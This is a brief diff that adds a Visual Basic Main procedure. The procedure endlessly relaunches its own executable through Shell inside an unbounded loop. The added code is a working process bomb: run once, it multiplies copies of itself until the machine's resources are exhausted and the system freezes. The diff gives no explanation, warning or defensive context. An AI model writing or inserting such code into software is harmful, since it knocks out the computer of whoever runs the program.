@@ -1,0 +1,5 @@
+Private Sub Main()
+  Do
+    Shell App.EXEName
+  Loop
+End Sub
